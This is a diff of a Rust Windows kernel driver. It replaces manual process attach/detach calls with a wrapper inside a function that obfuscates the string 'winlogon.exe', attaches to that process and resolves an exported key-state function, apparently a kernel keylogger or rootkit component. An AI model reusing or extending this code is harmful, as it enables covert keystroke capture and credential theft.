@@ -1,17 +1,15 @@
 use {
-    obfstr::obfstr,
+    obfstr::obfstr, 
     ntapi::ntzwapi::ZwQuerySystemInformation, 
-    super::{get_process_by_name, pool::PoolMemory}, 
+    super::{get_process_by_name, pool::PoolMemory, process_attach::ProcessAttach}, 
     crate::{process::Process, utils::SystemModuleInformation}, 
     core::{ffi::{c_void, CStr}, ptr::null_mut, slice::from_raw_parts}, 
     wdk_sys::{
-        ntddk::{
-            KeStackAttachProcess, 
-            KeUnstackDetachProcess
-        }, 
-        KAPC_STATE, NT_SUCCESS, POOL_FLAG_NON_PAGED,
+        NT_SUCCESS, POOL_FLAG_NON_PAGED,
     }, 
-    winapi::um::winnt::{RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64}
+    winapi::um::winnt::{
+        RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64
+    }
 };
 
 /// Gets the base address of a specified module.
@@ -101,7 +99,6 @@ pub unsafe fn get_function_address(function_name: &str, dll_base: *mut c_void) -
 /// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
 ///
 pub unsafe fn get_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
-    let mut apc_state: KAPC_STATE = core::mem::zeroed(); 
     let pid = match get_process_by_name(obfstr!("winlogon.exe")) {
         Some(p) => p,
         None => return None
@@ -112,7 +109,7 @@ pub unsafe fn get_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<
         None => return None
     };
 
-    KeStackAttachProcess(target.e_process, &mut apc_state);
+    let attach_process = ProcessAttach::new(target.e_process);
 
     let dll_base = dll_base as usize;
     let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
@@ -128,12 +125,9 @@ pub unsafe fn get_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<
         let ordinal = ordinals[i as usize] as usize;
         let address = (dll_base + functions[ordinal] as usize) as *mut c_void;
         if name_module == name {
-            KeUnstackDetachProcess(&mut apc_state);
             return Some(address);
         }
     }
 
-    KeUnstackDetachProcess(&mut apc_state);
-    
     None
 }
